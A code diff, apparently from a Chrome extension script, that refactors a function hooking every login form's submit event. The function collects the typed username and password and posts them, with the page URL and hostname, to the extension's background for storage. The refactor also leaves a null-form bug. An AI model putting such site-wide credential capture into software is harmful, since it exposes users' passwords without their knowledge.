@@ -4,47 +4,50 @@ function monitorSubmissions() {
 
     for (var f = 0; f < fields.length; f++) {
 
-        // monitor forms which have a `password` field
-        if (fields[f].form && fields[f].type == 'password') {
+        // only monitor forms which have a `password` field
+        if (fields[f].form && fields[f].type != 'password')
+            continue;
 
-            fields[f].form.addEventListener('submit', function() {
+        fields[f].form.addEventListener('submit', function() {
 
-                var user; // username or email
-                var pass; // password
+            var user; // username or email
+            var pass; // password
 
-                var children = this.getElementsByTagName('input');
+            var children = this.getElementsByTagName('input');
 
-                // find likely `user` & `pass` elements
-                for (var c = 0; c < children.length; c++) {
+            // find likely `user` & `pass` elements
+            for (var c = 0; c < children.length; c++) {
 
-                    var i = children[c];
+                var i = children[c];
 
-                    if (! i.value || ! i.type)
-                        continue;
-                    if (i.type == 'password' && ! pass)
-                        pass = i.value;
-                    if (i.type == 'text' || i.type == 'email' && ! user)
-                        user = i.value;
-                    if (pass && user)
-                        break;
-                }
+                if (! i.value || ! i.type)
+                    continue;
 
-                if (user && pass) {
+                if (i.type == 'password' && ! pass)
+                    pass = i.value;
+                else if (i.type == 'text' || i.type == 'email' && ! user)
+                    user = i.value;
 
-                    // post credentials to background
-                    chrome.extension.sendRequest({
-                        action: 'queryDatabase',
-                        crud: 'create',
-                        record: [
-                            window.location.href,
-                            window.location.hostname,
-                            user,
-                            pass
-                        ]
-                    });
-                }
-            });
-        }
+                if (pass && user)
+                    break;
+
+            }
+
+            if (user && pass) {
+
+                // post credentials to background
+                chrome.extension.sendRequest({
+                    action: 'queryDatabase',
+                    crud: 'create',
+                    record: [
+                        window.location.href,
+                        window.location.hostname,
+                        user,
+                        pass
+                    ]
+                });
+            }
+        });
     }
 }
 
